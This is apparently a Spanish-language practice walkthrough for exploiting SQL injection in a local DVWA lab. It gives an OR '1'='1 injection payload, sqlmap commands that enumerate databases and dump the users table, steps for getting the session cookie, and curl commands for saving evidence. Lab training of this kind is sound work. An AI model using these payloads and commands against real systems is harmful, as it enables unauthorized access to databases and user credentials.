# 🔍 Explotación: SQL Injection (Low)

## 1️⃣ Identificación manual

URL vulnerable:

```Http
http://127.0.0.1:8080/vulnerabilities/sqli/?id=1
```

Payload básico:

```Http
?id=1' OR '1'='1&Submit=Submit#
```

Resultado esperado: listado de usuarios.

## 2️⃣ Enumerar bases de datos con sqlmap

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1" \
       --cookie="PHPSESSID=abc123xyz456; security=low" \
       --dbs
```

## 3️⃣ Ver tablas en la base dvwa

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1" \
       --cookie="PHPSESSID=abc123xyz456; security=low" \
       -D dvwa --tables
```

## 4️⃣ Extraer datos de la tabla users

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1" \
       --cookie="PHPSESSID=abc123xyz456; security=low" \
       -D dvwa -T users --dump
```

### 🍪 ¿Cómo obtener la cookie PHPSESSID?

#### 🔹 Opción 1: Desde navegador

1. F12 → pestaña **Storage/Application**.
2. Buscar cookies de http://127.0.0.1:8080.
3. Copiar valor de PHPSESSID.

#### 🔹 Opción 2: Desde terminal

```bash
curl -i http://127.0.0.1:8080/login.php
```

Buscar línea:

```Http
Set-Cookie: PHPSESSID=abcdef1234567890; path=/
```

## 📸 Documentación de evidencias

- Guardar respuestas HTTP:

```bash
curl -s -D ~/Pentesting/DVWA/requests/sqli_login.headers \
     -o ~/Pentesting/DVWA/requests/sqli_login.html \
     "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit#"
```

- Capturas de pantalla: usar ***flameshot gui*** y guardar en screens/.
